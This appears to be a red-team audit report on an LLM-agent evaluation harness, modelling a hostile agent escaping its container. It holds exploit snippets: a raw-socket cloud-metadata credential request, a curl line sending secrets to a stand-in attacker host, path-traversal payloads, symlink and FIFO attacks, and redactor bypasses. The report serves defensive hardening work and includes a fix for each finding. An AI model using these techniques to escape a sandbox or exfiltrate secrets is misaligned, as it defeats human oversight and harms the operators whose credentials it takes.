# SwarmHarness — Open Security Findings

**Audit:** 4-round adversarial red-team review (network/proxy, container/orchestration, artifact-leak/verifier workstreams), with empirical PoCs where noted.
**Scope of this doc:** issues still open after the round-4 fixes (`lstrip("*.")` TLD takeover, `internet_mode`, egress service emission, redirect following, path allowlist v1, redactor NUL-sniff, crash-path redaction).
**Attacker model:** malicious LLM agent running inside the `agent` container (and separately: malicious task author who controls `task.toml`, `environment/`, `tests/verify.py`).

---

## CRITICAL

### C-1 · `allowlist` egress mode grants unrestricted internet (topology is voluntary)

**Files:** `src/swarmharness/compose_gen.py:34,44` · `src/swarmharness/spec.py:170-183`

```python
# compose_gen.py:34
networks["transit"] = {}          # NOT {"internal": true} → Docker NAT bridge with default route
...
agent_networks.append("transit")  # :44 attacker container attached
```

`HTTP_PROXY`/`HTTPS_PROXY` env vars (`compose_gen.py:46-50`) are advisory conventions honored only by cooperative HTTP libraries. Nothing enforces them at L3 — no iptables/nftables rule, no transparent REDIRECT.

**Confirmed new manifestation (round 4, empirically tested):** `internet = "allowlist"` with **empty** `net_egress` passes validation and produces an agent on non-internal `transit`. A task author writing the most restrictive-sounding configuration gets zero restrictions:

```
internet="allowlist", net_egress=[]  → agent_nets=['internal','transit'], transit_internal={}
```

**Exploit (any `net_egress`/`allowlist` task):**

```python
# inside agent container — ignores proxy env entirely
import socket
s = socket.create_connection(("169.254.169.254", 80), 3)   # cloud metadata of harness host
s.send(b"GET /latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: 169.254.169.254\r\n\r\n")
print(s.recv(4096))
# equally: curl --noproxy '*' https://c2.attacker.example/?d=$(base64 </workspace/secrets)
# any port, any protocol, ICMP/DNS/raw sockets included
```

Perverse inversion: `net_egress=[]` + default mode gives genuine isolation, while *configuring* an allowlist grants full internet. Every hardening in `egress/main.py` only governs traffic that voluntarily enters the tunnel — worth nothing against a hostile agent.

**Related:** `llmproxy` is dual-homed onto `internal`+`uplink`+`transit` **and** has `extra_hosts: host.docker.internal:host-gateway` (`compose_gen.py:60`) — the highest-value pivot target: compromising it yields the verifier's network segment, transit peers, host-gateway services, and the internet simultaneously.

**Fix:**
1. Reject `net_egress == []` when `internet = "allowlist"` (spec.py).
2. `networks["transit"] = {"internal": True}`; attach **only** the egress container to a real uplink network.
3. Remove `llmproxy` from `transit` (agent reaches proxy over `internal`; egress doesn't need it).
4. Enforce at engine level: iptables REDIRECT tcp/80,443 → transparent proxy + DROP rest in the agent netns (init container with NET_ADMIN), or nftables on a custom bridge.

---

## HIGH

### H-1 · Proxy path gate bypassed via normalize-after-check asymmetry *(PoC'd)*

**File:** `src/swarmharness/images/proxy/main.py:31-35`

```python
path = request.rel_url.path                      # %-decoded, dot-segments PRESERVED
if not path.startswith(ALLOWED_PREFIXES): ...    # checked here
target = UPSTREAM + request.rel_url.path_qs      # yarl ClientSession NORMALIZES ../ here
```

The gate evaluates the decoded-but-un-normalized string; yarl collapses `%2E%2E`/`../` when building the outbound URL. Verified end-to-end against aiohttp 3.9.5/yarl (the pinned versions):

| Raw request target | Gate | Upstream receives |
|---|---|---|
| `/v1/models%2f..%2f..%2fadmin` | PASS | **`GET /admin`** |
| `/v1/chat/completions/../../admin` | PASS | `GET /v1/admin` |
| `/v1/chat/completions/../models` | PASS | `GET /v1/chat/models` |
| `/v1/messagesbatches` | PASS (prefix overmatch) | verbatim |

**Impact:** arbitrary paths on the provider origin with the real API key attached. GETs are drive-by CSRF against the operator's authenticated provider relationship (dashboards, logout, settings); POSTs reach any same-origin endpoint.

**Fix:** normalize first, then exact-segment match:
```python
norm = URL(UPSTREAM + request.rel_url.path_qs).path
if not any(norm == p or norm.startswith(p + "/") for p in ALLOWED_PREFIXES): deny
```

### H-2 · Redaction pipeline disables its own passes; latin-1 crash silently skips files *(both PoC'd)*

**File:** `src/swarmharness/redact.py:71-81`

```python
scrubbed, count = redact_text(text)
if count:                                    # line 74 — early return
    return scrubbed.encode("latin-1"), count
decoded = urllib.parse.unquote(text)         # DEAD if any plaintext match existed
...
scrubbed, count = _redact_squashed(text)     # DEAD if either prior pass matched
```

1. **Early-return:** one plaintext match anywhere in a file skips the urlencoded AND squash passes for that entire file. PoC: `"token=fw_abcdefghijklmnopqrst\n…k=sk%2Dlive%2Dabcdef1234567890"` → urlencoded key survives.
2. **Crash-skip:** `unquote()` can produce chars > U+00FF; `.encode("latin-1")` raises (`UnicodeEncodeError`), swallowed by `except Exception: continue` in `redact_tree` (:93-96). PoC: `sk%2Dlive…%E2%82%AC` → whole file untouched, 0 redactions reported.

**Fix:** run all passes independently over the original text and union spans (or loop until fixpoint); encode with `errors="replace"`; log skipped files loudly instead of silent `continue`.

### H-3 · Host filesystem oracle + CLI hang via agent-planted files in the rw log mount *(both PoC'd)*

**Files:** `src/swarmharness/manifest.py:19-29` · `src/swarmharness/redact.py:84-101` · mount at `compose_gen.py:80`

Agent owns `/logs/agent` (rw bind mount).

1. **Symlink hash oracle:** `build_manifest` uses `rglob("*")` + `path.is_file()` + `stat()` + `sha256_file()` — all dereference symlinks; the redactor skips links (:87) so they're never removed. Agent runs `ln -s /etc/shadow /logs/agent/config.yaml` → published `run.json` leaks existence, size and sha256 of any host-readable file (offline brute-force of short secrets).
2. **FIFO hang:** `mkfifo /logs/agent/pwn.fifo` → host-side `redact_tree` blocks forever inside `read_bytes()` (open on FIFO with no writer blocks; no timeout, non-regular files not filtered). One bash line wedges `swarm run` indefinitely — no reward, no teardown. An 8 TiB sparse file also applies allocation pressure.

**Fix:** `st = path.lstat(); if not stat.S_ISREG(st.st_mode): continue` in both `redact_tree` and `build_manifest` (or hash link targets by name only); add size cap; consider `O_NONBLOCK`.

---

## MEDIUM

### M-1 · BLOCKED_NETS defeated by IPv4-mapped IPv6 / NAT64 *(PoC'd)*

**File:** `src/swarmharness/images/egress/main.py:10-37`

Verified: `ip_address('::ffff:169.254.169.254') in ip_network('169.254.0.0/16')` returns `False` (version mismatch short-circuits). Hostile AAAA records under an allowlisted zone (wildcard-DNS services) tunnel straight through the hardened proxy:

| Hostile DNS answer | resolve_pinned verdict |
|---|---|
| `::ffff:169.254.169.254` / `::ffff:127.0.0.1` | pinned → SSRF |
| `64:ff9b::a9fe:a9fe` (NAT64) | pinned |
| `::` (unspecified), TEST-NETs, Teredo | treated public |

Port pinning to 443 excludes classic IMDS(:80) but leaves every HTTPS private-range service (bridge gateway `172.x.0.1:443`, RFC1918 TLS, admin planes). Closed for credit: TOCTOU rebinding (connect-by-IP), TLS SNI/E2E validation, mixed public/private A-record sets (`all()` works).

**Fix:** canonicalize first (`addr.ipv4_mapped` → test as IPv4); version-aware membership; add `::ffff:0:0/96`, `64:ff9b::/96`, `::/128`, `2001:db8::/32`, TEST-NET ranges.

### M-2 · Secret-format coverage gaps in the redactor *(matrix empirically tested)*

**File:** `src/swarmharness/redact.py:7-25`

Still leaking end-to-end:
- Groq `gsk_…` (underscore defeats `sk-` literal), xAI `xai-…`, Perplexity `pplx-…`
- Azure/Mistral/Cohere/Together bare 32-hex or alnum keys; AWS secret keys (40-char base64, no prefix); `Ocp-Apim-Subscription-Key:` label not in keyword list
- Bare hex/base64/base64url encodings without a keyword label
- JSON `\uXXXX` escapes when dashes are escaped too (`"\u0073k\u002dlive…"`)
- Squash join defeated by any non-skipped separator: `{"k": "sk-abcd",\n "j": "efghijklmn"}` → `,`/`:` break the join (n=0)
- JWE 5-segment tokens partially consumed (trailing `.iv.ciphertext.tag` left)

Caught correctly now: DeepSeek/OpenRouter/Anthropic/OpenAI `sk-*`, Google `AIzaSy`, HF `hf_`, Fireworks `fw_`, GitHub `gh[pousr]_`, AWS AKIA ids, JWT triplets, `Bearer` prefix, generic keyword labels, split-inside-one-string JSON, squash span mapping (4000-trial fuzz clean).

**Fix:** add `gsk_|xai-|pplx-|csk-` patterns; extend keywords (`subscription[_-]?key`, `ocp[-_]apim`); JSON-unescape pass; entropy scan for ≥28-char high-entropy runs near credential-ish words; treat common separators as skippable within bounded windows. Add a leak-vector regression corpus (none exists).

### M-3 · Verifier output channel: reward.json published unredacted + rc ignored

**Files:** `runner.py:268-271` (redact pre-verifier only), `runner.py:193-196` (`_scrub_unredacted` scopes to agent_logs), `compose_gen.py:158` (`verification` rw into verifier), `runner.py:114-133`

1. Nothing ever scrubs `results/verification/reward.json` after the verifier runs; task-supplied verifier code can write anything there (LLM-judge verifiers embedding deliverable diffs are the realistic case), and the manifest then hashes it as canonical.
2. `_parse_reward` trusts `score` even when the verifier exited non-zero/crashed post-write — score-rigging window; `rc == -9` only affects the missing-file default.
3. Symlink laundering: verifier reads `/deliverables` ro but follows symlinks the agent planted → copies unscanned content into the published reward.

**Fix:** `redact_tree(results/"verification")` before `build_manifest`; require `rc==0 && status=="ok"` to honor a score; resolve/reject symlinks in deliverables before verification.

### M-4 · Stale crashed-run result directories are never swept

**File:** `runner.py:177-179` (mkdir-only), `cli.py` (no sweep command path)

The round-3 `finally`-scrub protects future crashes, but any `results/<run_id>/agent_logs` written before that fix — or from SIGKILL/power loss mid-write — stays raw forever with no marker distinguishing redacted from unredacted trees.

**Fix:** startup sweep: at CLI entry, scan `<task>/results/*` lacking a `run.json`/`.redacted` stamp and redact-or-quarantine them; stamp trees post-scrub.

### M-5 · Terminal markup injection via verifier-controlled check names *(PoC'd)*

**File:** `src/swarmharness/ui.py:161-164`

`checks[].name` from `reward.json` is interpolated into rich table rows without escaping — `[bold red]PWNED[/]` renders ANSI escapes/spoofed output in the operator console. Same trust class: a malicious verifier can forge operator-facing UI.

**Fix:** `rich.markup.escape()` on all verifier-derived strings.

### M-6 · Resource-exhaustion DoS kills scoring mid-run

**Files:** `proxy/main.py:36,80` vs `compose_gen.py:61` · `egress/main.py:64-70` · `runner.py:249-253` · `redact.py` squash cost

- Proxy buffers entire bodies (`await request.read()`, 256 MB cap) inside a 256 MB cgroup → one oversized POST OOM-kills it permanently (`restart: "no"`); verifier LLM calls then fail → score 0 recorded. Also `total=None, sock_read=900` lets ~100 slow streams pin the connector pool.
- Egress `reader.readline()` under a 30 s timer has no length bound — a fast multi-hundred-MB line OOMs the 128 MB egress box.
- Runner tick reads the entire (possibly multi-GB) log into RAM every 2 s (`log_path.read_bytes().count(b"\n")`).
- Squash pass ≈12× RAM amplification and ~0.4 s/MB, applied up to twice per file, on agent-controlled log volume.

**Fix:** stream bodies with bounded size (~8–16 MB cap), `total=` timeout, restart policy; readline length cap; incremental line counting; chunked/streaming redaction with `array('i')` index.

### M-7 · Header hygiene gaps at the key-injecting proxy *(empirically confirmed forwarding)*

**File:** `src/swarmharness/images/proxy/main.py:19-20`

Static denylist misses: `Connection:`-nominated headers (RFC 7230 §6.1 violation), `Cookie`, `X-Forwarded-For`/`X-Real-IP` (spoofable attribution toward CDN-fronted providers), plus prefix-overmatch junk paths. All ride upstream with the real key attached. Response-side drops (`set-cookie`, `server`, …) are working.

**Fix:** outbound allowlist (content-type/accept/user-agent/provider-specific), delete nominated headers, strip cookie + x-forwarded-*.

### M-8 · `PROXY_KEY` is decorative; proxy has no authentication

**Files:** `proxy/main.py` (no auth path exists), `compose_gen.py:105,147`

Hardcoded `dummy-not-a-secret` handed to agent and verifier; never validated anywhere. Any peer on `internal`/`transit` (incl. task-author-supplied verifier) gets unlimited real-key LLM use for the run. False assurance + free quota for hostile verifier code.

**Fix:** per-run random token, constant-time compare required on proxied routes; separate scoped keys/quota for verifier.

### M-9 · Pinned aiohttp 3.9.5 carries known smuggling advisories

**File:** `images/proxy/Dockerfile:3`

CVE-2024-52304 (chunk-extension parsing, fixed 3.10.11), CVE-2025-53643 (chunk trailers, fixed 3.12.14), CWE-444 — exactly this component's topology. Mitigated when C extensions load (default wheels), exposed under `AIOHTTP_NO_EXTENSIONS`/sdist fallback; framing battery shows current parser rejects dup-CL/CL+TE, so practical risk is LOW-MED. An EOL line invites future advisories.

**Fix:** bump to `aiohttp>=3.13.3`.

### M-10 · Demo/scaffold verifier pays 0.5 for doing nothing; no threshold gate on `run`

**Files:** `examples/demo-task/tests/verify.py:9-13` · `scaffold.py:58-62` · `ui.py:121`

`file_exists` alone banks half the reward for an empty file; the normal `swarm run` path applies no passing threshold (only `oracle` does). Scaffold-generated verifiers inherit the design.

**Fix:** single-check verifiers (or weight existence 0); optional `--min-score` gate on run summary.

### M-11 · Raw logs stream live to the host for the entire agent run

**Files:** `images/agent-base/entrypoint.sh:30` (`tee /logs/agent/opencode.txt`) · mount `compose_gen.py:80`

Pre-redaction plaintext window equals the whole agent phase (up to `agent_timeout_sec`, default 7200 s) on the researcher's disk. Crash-path scrubbing helps afterwards, but the window itself is the exposure.

**Fix:** pipe opencode output through an in-container scrubber before tee, or write to an isolated volume swapped in post-scrub.

---

## LOW

| # | Finding | Where | Note / Fix |
|---|---|---|---|
| L-1 | `DOMAIN_RE` `$` anchor accepts trailing newline (`"evil.com\n"` matches) | spec.py:15 | Use `\Z`/`re.fullmatch`; currently neutralized downstream by `.strip()` but a control char survives into manifests |
| L-2 | Newline-bearing model id survives TOML→env→YAML, corrupting opencode config/metadata | spec.py:140-142, compose_gen.py:98, gen_config.py | Charset-validate model: `^[A-Za-z0-9._/+-]{1,100}$` (round-2 command-substitution claim was refuted — quoted expansion is safe) |
| L-3 | No idle timeout on established egress tunnels → fd/memory buildup | egress/main.py:45-59 | Idle-timeout both pipe legs |
| L-4 | `work/` excluded from manifest hashing → sandbox definition (docker-compose.yml) has no tamper evidence | manifest.py:21 | Include it (or hash separately) |
| L-5 | `SWARM_LLM_BASE_URL` persisted verbatim in run.json/compose (userinfo/query creds would publish) | runner.py:283, compose_gen.py:56 | Sanitize with yarl; scheme allowlist (also refuse `http://` upstreams — key in cleartext across uplink) |
| L-6 | Agent can tamper its own trajectory source DB pre-export (owns sqlite file) | images/agent-base/export_trajectory.py:6,25-33 | Snapshot DB read-only from host right after container exit; session-id filename collisions/cosmetic weirdness also noted (traversal contained by role-prefix glue) |
| L-7 | Egress service has no healthcheck; `depends_on: service_started` → crashed-at-boot egress silently yields fully-isolated agents labeled "restricted" | compose_gen.py:35-42,94 | Healthcheck + `service_healthy`; surface mode in UI |
| L-8 | Dead `phase()` function; cosmetic dead code | runner.py:201-203 | Remove |
| L-9 | Historical generated artifacts show unpinned verifier image from pre-fix installs | examples/demo-task/results/*/work/ | Regenerate/reinstall before trusting old artifacts |

---

## Verified-clean areas (no action needed)

- Real API key exists **only** in the llmproxy container; compose file keeps literal `${SWARM_LLM_API_KEY:-}` placeholder; agent/verifier get dummy key; gen_config writes outside exported mounts; exported trajectories contain no key material.
- Verifier integrity vs the agent: tests mounted ro into separate container only, `/reward` rw only there, exit-code fakery impossible, garbage/missing/out-of-range scores fail closed (`runner.py:122-133`).
- Per-project volumes/networks + unique run_ids prevent cross-run contamination; `down -v` teardown.
- Non-root agent user, root-owned `/opt` scripts, no docker socket, `init: true`.
- Scaffold (`swarm create`): name regex blocks traversal/`..`; marker sanitization sound; format-string injection refuted; overwrite refused; generated verify.py fails closed on exceptions.
- Redirect following disabled; absolute-form/CONNECT/WebSocket-upgrade abuse through the proxy rejected; response hop-by-hop/set-cookie dropped; rebinding TOCTOU closed (connect-by-IP); internal-network DNS exfil empirically blocked on Docker Desktop 29.7.2 (platform-dependent — keep an eye on native Linux dockerd).

---

## Recommended fix order

1. **C-1** — internal transit + empty-allowlist rejection + de-dual-home llmproxy (nothing else matters for hostile agents until this lands)
2. **H-1** — normalize-before-check in proxy path gate
3. **H-2/H-3** — restructure `redact_bytes` passes; regular-file/symlink filters in redact_tree + manifest
4. **M-3/M-4** — post-verifier redaction, rc gating, stale-dir sweep
5. **M-1** — mapped-v6/NAT64 canonicalization
6. **M-2** — provider patterns + leak-vector test corpus
7. Remaining mediums/lows in table order
